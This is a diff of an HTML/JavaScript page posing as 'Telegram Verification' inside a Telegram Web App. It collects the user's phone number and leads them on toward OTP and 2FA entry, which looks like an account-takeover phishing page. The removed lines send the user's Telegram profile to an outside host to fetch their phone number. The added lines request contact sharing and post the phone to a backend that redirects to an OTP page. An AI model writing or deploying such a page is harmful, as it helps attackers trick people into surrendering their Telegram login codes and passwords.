@@ -1,174 +1,373 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Telegram Verification</title>
-
-<script src="https://telegram.org/js/telegram-web-app.js"></script>
-
-<style>
-*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto}
-body{background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;margin:0;display:flex;justify-content:center;align-items:center;padding:20px}
-.container{background:#fff;border-radius:16px;max-width:420px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.25)}
-.header{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;text-align:center;padding:20px}
-.content{padding:20px}
-.btn{width:100%;padding:14px;border-radius:10px;border:none;color:#fff;font-size:15px;font-weight:600;background:linear-gradient(135deg,#667eea,#764ba2);cursor:pointer}
-.input{width:100%;padding:12px;border-radius:10px;border:1px solid #ccc;margin-bottom:12px}
-.info{background:#e8f5e9;border-radius:10px;padding:12px;margin-bottom:12px}
-.error{background:#ffebee;color:#c62828;border-radius:10px;padding:12px;margin-bottom:12px;display:none}
-.hidden{display:none}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px 20px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            opacity: 0.9;
+            font-size: 14px;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, opacity 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            opacity: 0.95;
+        }
+        
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        .btn-secondary {
+            background: #666;
+        }
+        
+        .btn-secondary:hover {
+            background: #555;
+        }
+        
+        .error {
+            background: #ffebee;
+            color: #c62828;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            font-size: 14px;
+            display: none;
+        }
+        
+        .error.show {
+            display: block;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 40px 20px;
+        }
+        
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .info-box {
+            background: #e8f5e9;
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        
+        .phone-display {
+            background: #f0f0f0;
+            padding: 12px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            text-align: center;
+            font-weight: bold;
+        }
+    </style>
 </head>
-
 <body>
-<div class="container">
-  <div class="header">
-    <h3>🔐 Account Verification</h3>
-  </div>
-
-  <div class="content">
-
-    <div id="user-info" class="info hidden"></div>
-
-    <button class="btn" onclick="startFlow()">Continue</button>
-
-    <div id="auto" class="info hidden"></div>
-
-    <div id="manual" class="hidden">
-      <input id="phone" class="input" placeholder="Enter phone number">
-      <button class="btn" onclick="submitPhone()">Continue</button>
+    <div class="container">
+        <div class="header">
+            <h1>🔐 Account Verification</h1>
+            <p>Verify your Telegram account</p>
+        </div>
+        
+        <div class="content">
+            <!-- Initial Screen -->
+            <div id="initial-screen">
+                <div class="info-box">
+                    <b>Verification Process:</b><br>
+                    1. Click "Share Contact" below<br>
+                    2. OTP will be sent to your phone<br>
+                    3. Enter OTP in next screen<br>
+                    4. Complete 2FA if enabled
+                </div>
+                
+                <div class="error" id="error-message"></div>
+                
+                <button class="btn" onclick="shareContact()" id="share-btn">
+                    📞 Share My Contact
+                </button>
+                
+                <p style="text-align: center; color: #666; font-size: 14px; margin-top: 15px;">
+                    Your contact will be used only for OTP verification
+                </p>
+            </div>
+            
+            <!-- Contact Shared Screen -->
+            <div id="contact-screen" class="hidden">
+                <div class="phone-display" id="phone-display">
+                    Phone: Not shared yet
+                </div>
+                
+                <div class="error" id="contact-error"></div>
+                
+                <div class="info-box">
+                    ✅ Contact shared successfully!<br>
+                    Sending OTP to your phone...
+                </div>
+            </div>
+            
+            <!-- Loading Screen -->
+            <div id="loading-screen" class="hidden">
+                <div class="loading">
+                    <div class="loading-spinner"></div>
+                    <p id="loading-text">Processing...</p>
+                </div>
+            </div>
+        </div>
     </div>
 
-    <div id="loading" class="info hidden">Processing…</div>
-
-    <div id="error" class="error"></div>
-
-  </div>
-</div>
-
-<script>
-let tg = window.Telegram?.WebApp;
-let user_tg = {};
-let bot_id = "37059";
-
-document.addEventListener("DOMContentLoaded", () => {
-
-  if(tg?.initDataUnsafe?.user){
-    const u = tg.initDataUnsafe.user;
-
-    user_tg = {
-      id: u.id,
-      first_name: u.first_name || "",
-      last_name: u.last_name || "",
-      language_code: u.language_code || "",
-      allows_write_to_pm: true,
-      photo_url: u.photo_url || ""
-    };
-
-    document.getElementById("user-info").innerText =
-      `👤 ${u.first_name||""} ${u.last_name||""}\n@${u.username||"-"}\n🌐 ${u.language_code||"-"}`;
-
-    document.getElementById("user-info").classList.remove("hidden");
-
-    tg.expand();
-  } else {
-    // fallback for testing
-    user_tg = {
-      id: 1,
-      first_name: "Test",
-      last_name: "User",
-      language_code: "en",
-      allows_write_to_pm: true,
-      photo_url: ""
-    };
-  }
-});
-
-
-function startFlow(){
-  show("loading");
-  hide("error");
-  hide("manual");
-  hide("auto");
-
-  fetch("https://pulema.lorwoxixo.com/api/get-bot",{
-    method:"POST",
-    headers:{
-      "accept":"*/*",
-      "content-type":"application/json",
-      "origin":"https://pulema.lorwoxixo.com",
-      "referer":"https://pulema.lorwoxixo.com/?bot_id=37059"
-    },
-    body:JSON.stringify({
-      user_tg:user_tg,
-      bot_id:bot_id
-    })
-  })
-  .then(async res=>{
-    let text = await res.text();
-    console.log("RAW RESPONSE:",text);
-
-    let data = JSON.parse(text);
-
-    hide("loading");
-
-    if(data.ok && data.phone_number){
-      document.getElementById("auto").innerText =
-        `📞 Phone detected: +${data.phone_number}\nContinuing…`;
-      show("auto");
-
-      continueVerification(data.phone_number);
-    } else {
-      show("manual");
-    }
-  })
-  .catch(err=>{
-    hide("loading");
-    show("manual");
-    showError("Network error — please enter phone manually");
-  });
-}
-
-
-function submitPhone(){
-  const phone = document.getElementById("phone").value.trim();
-  if(!phone) return showError("Enter phone number");
-
-  continueVerification(phone);
-}
-
-
-function continueVerification(phone){
-  show("loading");
-
-  // your backend OTP call
-  fetch("/api/verify-contact",{
-    method:"POST",
-    headers:{ "Content-Type":"application/json" },
-    body:JSON.stringify({ phone })
-  })
-  .then(r=>r.json())
-  .then(res=>{
-    hide("loading");
-    if(res.success) window.location.href = res.redirect_url;
-    else showError(res.error || "Verification failed");
-  })
-  .catch(()=>{
-    hide("loading");
-    showError("Network error");
-  });
-}
-
-
-/* Helpers */
-function show(id){document.getElementById(id).classList.remove("hidden")}
-function hide(id){document.getElementById(id).classList.add("hidden")}
-function showError(msg){
-  let e=document.getElementById("error");
-  e.innerText=msg;
-  e.style.display="block";
-}
-</script>
+    <script>
+        let sessionId = null;
+        let phoneNumber = null;
+        
+        // Initialize WebApp
+        document.addEventListener('DOMContentLoaded', function() {
+            // Get Telegram WebApp user data
+            const tg = window.Telegram?.WebApp;
+            
+            if (tg) {
+                // Initialize WebApp
+                tg.expand();
+                tg.enableClosingConfirmation();
+                
+                // Get user info
+                const user = tg.initDataUnsafe?.user || {};
+                const userId = user.id || 'unknown';
+                const username = user.username || '';
+                const firstName = user.first_name || '';
+                const lastName = user.last_name || '';
+                
+                // Initialize session with backend
+                fetch('/init-session', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        user_id: userId,
+                        username: username,
+                        first_name: firstName,
+                        last_name: lastName
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        sessionId = data.session_id;
+                        console.log('Session created:', sessionId);
+                    } else {
+                        showError('Failed to initialize session');
+                    }
+                })
+                .catch(error => {
+                    console.error('Session init error:', error);
+                    showError('Connection error. Please try again.');
+                });
+            } else {
+                // For testing outside Telegram
+                console.log('Running outside Telegram WebApp');
+                fetch('/init-session', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        user_id: 'test_user',
+                        username: 'test',
+                        first_name: 'Test',
+                        last_name: 'User'
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        sessionId = data.session_id;
+                        console.log('Test session created:', sessionId);
+                    }
+                });
+            }
+        });
+        
+        function shareContact() {
+            if (!sessionId) {
+                showError('Session not initialized. Please wait...');
+                return;
+            }
+            
+            const tg = window.Telegram?.WebApp;
+            
+            if (tg && tg.showContactRequest) {
+                // Request contact sharing via Telegram WebApp
+                tg.showContactRequest(async (contact) => {
+                    if (contact) {
+                        handleContactReceived(contact);
+                    } else {
+                        showError('Contact sharing cancelled');
+                    }
+                });
+            } else {
+                // Fallback for testing
+                const testPhone = prompt('Enter phone number for testing (with +):', '+1234567890');
+                if (testPhone) {
+                    const fakeContact = {
+                        phone_number: testPhone,
+                        first_name: 'Test',
+                        last_name: 'User'
+                    };
+                    handleContactReceived(fakeContact);
+                }
+            }
+        }
+        
+        function handleContactReceived(contact) {
+            phoneNumber = contact.phone_number;
+            
+            // Show contact screen
+            document.getElementById('initial-screen').classList.add('hidden');
+            document.getElementById('contact-screen').classList.remove('hidden');
+            document.getElementById('phone-display').textContent = `Phone: ${phoneNumber}`;
+            
+            // Send contact to backend
+            sendContactToBackend(phoneNumber);
+        }
+        
+        function sendContactToBackend(phone) {
+            showLoading('Sending OTP...');
+            
+            fetch('/api/verify-contact', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    session_id: sessionId,
+                    phone: phone
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    // Redirect to OTP page
+                    window.location.href = data.redirect_url;
+                } else {
+                    hideLoading();
+                    document.getElementById('contact-error').textContent = data.error || 'Failed to send OTP';
+                    document.getElementById('contact-error').classList.add('show');
+                    
+                    // Show retry button
+                    setTimeout(() => {
+                        document.getElementById('contact-screen').classList.add('hidden');
+                        document.getElementById('initial-screen').classList.remove('hidden');
+                    }, 3000);
+                }
+            })
+            .catch(error => {
+                hideLoading();
+                showError('Network error. Please try again.');
+            });
+        }
+        
+        function showLoading(message) {
+            document.getElementById('loading-text').textContent = message || 'Processing...';
+            document.getElementById('contact-screen').classList.add('hidden');
+            document.getElementById('loading-screen').classList.remove('hidden');
+        }
+        
+        function hideLoading() {
+            document.getElementById('loading-screen').classList.add('hidden');
+        }
+        
+        function showError(message) {
+            const errorEl = document.getElementById('error-message');
+            errorEl.textContent = message;
+            errorEl.classList.add('show');
+            
+            setTimeout(() => {
+                errorEl.classList.remove('show');
+            }, 5000);
+        }
+    </script>
 </body>
 </html>
